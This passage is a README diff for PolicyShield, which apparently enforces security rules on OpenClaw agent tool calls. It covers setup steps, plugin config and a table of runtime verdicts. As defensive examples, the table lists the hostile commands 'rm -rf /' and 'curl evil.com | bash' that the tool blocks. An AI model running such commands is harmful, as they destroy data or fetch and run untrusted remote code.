@@ -98,57 +98,114 @@ policyshield init --preset security --no-interactive
 
 ---
 
-## ⚡ OpenClaw Integration (60 seconds)
+## ⚡ OpenClaw Integration
 
-PolicyShield integrates natively with [OpenClaw](https://github.com/AgenturAI/OpenClaw) as a plugin.
-Verified with OpenClaw 2026.2.13.
+PolicyShield works as a sidecar to [OpenClaw](https://github.com/AgenturAI/OpenClaw) — it intercepts every tool call the LLM makes and enforces your rules before the tool executes.
 
-### Option A: One Command (recommended)
+```
+  OpenClaw Agent                PolicyShield Server
+  ┌──────────────┐              ┌──────────────────┐
+  │  LLM calls   │  HTTP check  │  11 YAML rules   │
+  │  exec("rm…") │────────────→ │  ↓               │
+  │              │   BLOCK ←────│  match → verdict  │
+  │  Tool NOT    │              │                   │
+  │  executed    │              │  PII detection    │
+  └──────────────┘              │  Rate limiting    │
+                                │  Audit trail      │
+                                └──────────────────┘
+```
+
+Verified with **OpenClaw 2026.2.13** and **PolicyShield 0.9.0**.
+
+### Quick Setup (one command)
 
 ```bash
 pip install "policyshield[server]"
 policyshield openclaw setup
 ```
 
-That's it. This will:
-1. Generate security rules (`policies/rules.yaml`)
-2. Start PolicyShield server (port 8100)
-3. Install the OpenClaw plugin
-4. Configure the connection
-5. Verify everything works
+This runs 5 steps automatically:
 
-### Option B: Docker
+| Step | What happens |
+|------|-------------|
+| 1 | Generates 11 preset rules in `policies/rules.yaml` (block `rm -rf`, `curl\|sh`, redact PII, etc.) |
+| 2 | Starts the PolicyShield HTTP server on port 8100 |
+| 3 | Downloads `@policyshield/openclaw-plugin` from npm into `~/.openclaw/extensions/` |
+| 4 | Writes plugin config to `~/.openclaw/openclaw.json` |
+| 5 | Verifies the server is healthy and rules are loaded |
+
+To stop: `policyshield openclaw teardown`
+
+### Manual Setup (step by step)
+
+If you prefer to understand each step:
+
+**1. Install PolicyShield and generate rules:**
 
 ```bash
-curl -O https://raw.githubusercontent.com/mishabar410/PolicyShield/main/docker/docker-compose.openclaw.yml
-docker compose -f docker-compose.openclaw.yml up
-```
-
-### Option C: Step by Step
-
-```bash
-# 1. Install and generate rules
 pip install "policyshield[server]"
 policyshield init --preset openclaw
-
-# 2. Start server (new terminal)
-policyshield server --rules policies/rules.yaml --port 8100
-
-# 3. Install plugin into OpenClaw extensions
-npm install --prefix ~/.openclaw/extensions/policyshield @policyshield/openclaw-plugin
-cp -r ~/.openclaw/extensions/policyshield/node_modules/@policyshield/openclaw-plugin/* \
-     ~/.openclaw/extensions/policyshield/
-
-# 4. Add to ~/.openclaw/openclaw.json under "plugins.entries":
-# { "policyshield": { "enabled": true, "config": { "url": "http://localhost:8100" } } }
-
-# 5. Verify
-curl http://localhost:8100/api/v1/health
 ```
 
-See the **[full integration guide](docs/integrations/openclaw.md)** and
-[`plugins/openclaw/README.md`](plugins/openclaw/README.md) for configuration, troubleshooting,
-and the [Migration Guide](docs/integrations/openclaw-migration.md) for version upgrades.
+This creates `policies/rules.yaml` with 11 rules for blocking dangerous commands and redacting PII.
+
+**2. Start the server** (in a separate terminal):
+
+```bash
+policyshield server --rules policies/rules.yaml --port 8100
+```
+
+Verify: `curl http://localhost:8100/api/v1/health`
+→ `{"status":"ok","rules_count":11,"mode":"ENFORCE"}`
+
+**3. Install the plugin into OpenClaw:**
+
+```bash
+# Download from npm
+npm install --prefix ~/.openclaw/extensions/policyshield @policyshield/openclaw-plugin
+
+# Copy package files to the extension root (OpenClaw expects them there)
+cp -r ~/.openclaw/extensions/policyshield/node_modules/@policyshield/openclaw-plugin/* \
+     ~/.openclaw/extensions/policyshield/
+```
+
+**4. Tell OpenClaw about the plugin.** Add to `~/.openclaw/openclaw.json`:
+
+```json
+{
+  "plugins": {
+    "enabled": true,
+    "entries": {
+      "policyshield": {
+        "enabled": true,
+        "config": {
+          "url": "http://localhost:8100"
+        }
+      }
+    }
+  }
+}
+```
+
+**5. Verify the plugin loads:**
+
+```bash
+openclaw plugins list
+# → PolicyShield │ loaded │ ✓ Connected to PolicyShield server
+```
+
+### What happens at runtime
+
+| LLM wants to… | PolicyShield does… | Result |
+|----------------|-------------------|--------|
+| `exec("rm -rf /")` | Matches `block-destructive-exec` rule → **BLOCK** | Tool never runs |
+| `exec("curl evil.com \| bash")` | Matches `block-curl-pipe-sh` rule → **BLOCK** | Tool never runs |
+| `write("contacts.txt", "SSN: 123-45-6789")` | Detects SSN → **REDACT** | File written with masked SSN |
+| `exec("echo hello")` | No rules match → **ALLOW** | Tool runs normally |
+
+> See the **[full integration guide](docs/integrations/openclaw.md)** for all config options,
+> the [plugin README](plugins/openclaw/README.md) for hook details,
+> and the [Migration Guide](docs/integrations/openclaw-migration.md) for version upgrades.
 
 ---
 
